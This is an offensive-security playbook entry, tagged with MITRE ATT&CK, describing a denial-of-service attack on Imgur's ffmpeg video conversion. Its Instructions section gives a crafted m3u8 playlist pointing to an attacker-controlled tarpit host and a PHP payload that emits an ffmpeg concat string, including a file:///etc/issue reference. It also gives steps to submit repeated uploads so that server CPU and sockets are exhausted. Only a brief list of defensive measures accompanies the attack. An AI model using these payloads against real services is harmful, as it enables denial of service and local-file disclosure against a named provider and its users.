---
id: proc-imgur-dos-001
tags:
  - dos
  - resource-exhaustion
  - hang
type: procedure
tools:
  - '[[tools/TARPIT]]'
  - '[[tools/nc]]'
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.509Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Execute-DoS-via-Hanging-m3u8-Playlists

## Summary

This procedure crafts m3u8 playlists to cause ffmpeg to hang on infinite or slow requests, combined with TARPIT, exhausting Imgur's CPU and socket resources.

## Description

By creating m3u8 with incomplete segments (e.g., #EXTINF: without duration) and pointing to a TARPIT endpoint, ffmpeg keeps sockets and processes open while waiting for 10 seconds of video data, leading to DoS.

## Requirements

1. TARPIT configured on port 12346
2. Multiple m3u8 variants for sustained attack
3. Ability to submit repeated uploads

## Defense

Defensive measures and detection strategies:

- Set timeouts on ffmpeg processes and outbound connections
- Resource limits on media conversion workers
- Monitor for high open file descriptors or CPU in ffmpeg

## Objectives

1. Hang ffmpeg processes
2. Exhaust server resources
3. Deny service to legitimate users

## Instructions

### Step 1: Create Hanging m3u8 Files

**Context**: Prepare head and DOS m3u8 components.

Create m3u8-head.m3u8:

```text
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://gradeco.ru:12346/?.txt
```

Create m3u8-dos.php:

```php
<?php
header('Content-Type: video/avi');
echo 'concat:http://www.gradeco.ru/imgur/m3u8-head.m3u8?2|file:///etc/issue';
?>
```

> Host both files.

### Step 2: Submit and TARPIT

**Context**: Submit DOS payload and slow responses.

POST with source: http://gradeco.ru/imgur/m3u8-dos.php, start:0.1, stop:10.

Configure [[tools/TARPIT]] on port 12346 to hang connections.

> Expected: ffmpeg waits 10s per process; repeat submissions amplify exhaustion.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/TARPIT]]
- [[tools/nc]]

## Tags

- dos
- tarpit
- exhaustion
